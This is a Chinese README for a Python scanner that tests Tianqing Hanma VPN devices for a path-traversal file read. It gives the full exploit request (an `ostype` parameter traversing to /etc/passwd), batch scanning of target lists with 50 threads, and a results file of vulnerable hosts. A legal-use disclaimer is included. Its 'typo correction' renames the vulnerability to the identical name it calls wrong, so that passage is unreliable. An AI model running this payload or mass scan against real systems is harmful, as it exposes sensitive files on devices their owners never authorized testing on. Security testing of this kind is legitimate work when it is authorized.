# 天清汉马VPN任意文件读取漏洞POC工具

## 工具简介
本工具用于检测**天清汉马VPN设备**是否存在任意文件读取漏洞。该漏洞通过构造特殊请求路径，可读取服务器敏感系统文件（如`/etc/passwd`），可能导致服务器信息泄露，进一步威胁系统安全。

工具基于Python开发，支持单URL检测与多URL批量检测，通过多线程提升批量检测效率，并将存在漏洞的目标结果保存至本地文件，方便后续分析。


## 漏洞原理
天清汉马VPN设备的`/vpn/user/download/client`接口存在路径遍历漏洞，攻击者可通过`ostype`参数传入`../../../../../../../../../etc/passwd`等路径遍历 payload，绕过服务器文件访问限制，读取`/etc/passwd`（Linux系统用户信息文件）等敏感文件。

本工具通过检测目标是否能成功返回`/etc/passwd`中的特征内容（如`root:x:0:0:root:/root:/sbin/nologin`），判断目标是否存在该漏洞。


## 环境依赖
### 基础环境
- Python 3.6 及以上版本（推荐Python 3.8+）
- 网络连通性（需能访问目标VPN设备的HTTP/HTTPS端口）

### 依赖库
工具依赖以下Python第三方库，需提前安装：
| 依赖库 | 作用 |
|--------|------|
| `requests` | 发送HTTP/HTTPS请求 |
| `urllib3` | 处理HTTPS证书警告（已禁用不安全请求警告） |
| `argparse` | 解析命令行参数（Python标准库，无需额外安装） |
| `multiprocessing.dummy` | 实现多线程批量检测（Python标准库，无需额外安装） |

### 安装命令
打开终端/命令提示符，执行以下命令安装依赖库：
```bash
pip install requests urllib3
```


## 工具使用
### 命令格式
工具通过命令行参数指定检测模式（单URL/批量URL），基本命令格式如下：
```bash
python 工具文件名.py [参数]
```

### 参数说明
| 参数 | 简写 | 作用 | 示例 |
|------|------|------|------|
| `--url` | `-u` | 单URL检测，指定单个目标VPN设备地址 | `-u http://192.168.1.100` 或 `-u https://vpn.example.com` |
| `--file` | `-f` | 批量检测，指定包含多个目标URL的文本文件路径 | `-f target_urls.txt` |
| `--help` | `-h` | 查看工具帮助信息，展示参数说明 | `-h` |

### 操作示例
#### 1. 查看帮助信息
```bash
python hanma_vpn_poc.py -h
```
输出结果：
```
usage: hanma_vpn_poc.py [-h] [-u URL] [-f FILE]

天清汉马vpn任意文件读取漏洞 

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     place input like http://192.168.1.100
  -f FILE, --file FILE  place input your target file path (each URL per line)
```

#### 2. 单URL检测
检测单个目标（如`http://192.168.1.200`）是否存在漏洞：
```bash
python hanma_vpn_poc.py -u http://192.168.1.200
```
**输出说明**：
- `[+] http://192.168.1.200 存在任意文件读取漏洞`：目标存在漏洞（注：代码中漏洞类型描述为笔误，实际为“任意文件读取漏洞”），并自动写入`result1.txt`。
- `[-] 该http://192.168.1.200 不存在任意文件读取漏洞`：目标不存在漏洞。
- `[*] 该http://192.168.1.200 存在问题,请手工测试`：目标HTTP状态码非200，需手工排查（如端口不可达、访问权限限制等）。

#### 3. 批量URL检测
1. **准备目标文件**：创建`target_urls.txt`，每行写入一个目标URL（支持HTTP/HTTPS，若未指定协议，工具自动补充`http://`），示例内容：
   ```
   http://192.168.1.100
   https://vpn.example.com
   192.168.1.101:8443  # 带端口的URL
   ```
2. **执行批量检测**：
   ```bash
   python hanma_vpn_poc.py -f target_urls.txt
   ```
3. **结果保存**：存在漏洞的目标URL会自动追加保存至当前目录下的`result1.txt`文件中，格式为每行一个URL。


## 注意事项
1. **合法性声明**：
   - 本工具仅用于**合法授权的安全测试**（如企业内部安全自查、经客户授权的渗透测试），禁止用于未授权的攻击行为。
   - 滥用本工具可能违反《中华人民共和国网络安全法》《刑法》等法律法规，使用者需承担相应法律责任。

2. **网络环境**：
   - 确保工具运行设备能访问目标VPN设备的端口（通常为80/443，或自定义端口），若存在防火墙、WAF等防护设备，需提前排除干扰。
   - 工具已禁用HTTPS证书验证警告（`urllib3.disable_warnings`），适用于自签名证书的VPN设备，但可能存在一定安全风险（仅建议测试环境使用）。

3. **性能优化**：
   - 批量检测默认使用50个线程（`Pool(50)`），若目标数量过多或网络带宽有限，可修改代码中`mp=Pool(50)`的数字（如改为20、30），避免因线程过多导致网络拥堵或被目标设备拦截。

4. **漏洞类型修正**：
   - 代码中`print(f"[+]{target}存在任意文件读取漏洞")`为笔误，该漏洞实际为**任意文件读取漏洞**，使用时需注意区分，可手动修改代码中的漏洞类型描述以避免误解。

5. **结果验证**：
   - 工具检测结果仅为初步判断，若显示存在漏洞，建议通过浏览器或`curl`命令手工验证（如访问`https://target/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd`），确认是否真的能读取敏感文件。


## 故障排查
| 常见问题 | 可能原因 | 解决方案 |
|----------|----------|----------|
| 执行命令后无任何输出 | 1. 参数错误（如同时指定`-u`和`-f`，或文件路径错误）<br>2. 目标文件为空 | 1. 执行`-h`检查参数格式，确保仅指定一种检测模式<br>2. 检查`target_urls.txt`是否有有效URL |
| 批量检测时部分目标无响应 | 1. 目标设备离线或端口不可达<br>2. 目标存在防护，拦截了工具请求 | 1. 使用`ping`、`telnet`测试目标网络连通性<br>2. 手动访问目标URL，排查是否存在防护机制 |
| `result1.txt`未生成 | 1. 无任何目标存在漏洞<br>2. 工具无写入权限（如Windows权限不足） | 1. 确认目标是否真的不存在漏洞，可手工测试<br>2. 以管理员身份运行终端/命令提示符，重新执行工具 |
| 报错`ModuleNotFoundError: No module named 'requests'` | 未安装`requests`库 | 执行`pip install requests`安装依赖 |
